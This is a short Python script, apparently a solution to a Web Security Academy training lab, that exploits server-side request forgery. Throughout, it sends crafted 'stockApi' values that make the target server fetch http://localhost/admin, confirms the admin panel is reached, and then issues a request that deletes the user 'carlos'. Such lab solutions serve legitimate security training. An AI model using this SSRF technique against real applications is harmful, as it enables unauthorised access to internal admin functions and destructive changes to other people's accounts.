import requests

requests.packages.urllib3.disable_warnings()


'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

data = {
     
    "stockApi" : "http://127.0.0.1/admin"

}

defaultData = {
     
    "stockApi" : "http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"

}

URL = "https://0a1400bc03ca08bc82363dcd00310045.web-security-academy.net/product/stock"

Carlos_Payload = {

    "stockApi" : "http://localhost/admin/delete?username=carlos"

}

r = requests.post(URL, defaultData, verify=False)

try:
    if r.status_code == 200:

        print(f"[+] URL is accessible with Default POST Data: {URL}")
        print(f"[+] Sending the crafted payload: {data}")
        
        r = requests.post(URL, data)
        if r.status_code == 200:
            print("[+] Crafted Payload Working")
            if "Admin panel" in r.text:
                print("[+] Got access to admin panel")
                print(f"[+] Found Carlos at Offset: {r.text.find('carlos')}")
                print(f"[+] PATH to delete Carlos Account: {r.text[2775:2775+29]}")
                print("[+] Deleting Carlos User")

                r = requests.post(URL, data=Carlos_Payload)
                
                if "Congratulations" in r.text:
                    print("[+] Carlos user has been deleted")
                    print("[-] Lab Completed")
                else:
                    print("Something went wrong")
            else:
                print("[+] Admin panel not accessible")
        else:
            print("[+] Did not work")
    else:
        print("Something Went Wrong")

except:
    print("Something went wrong!")

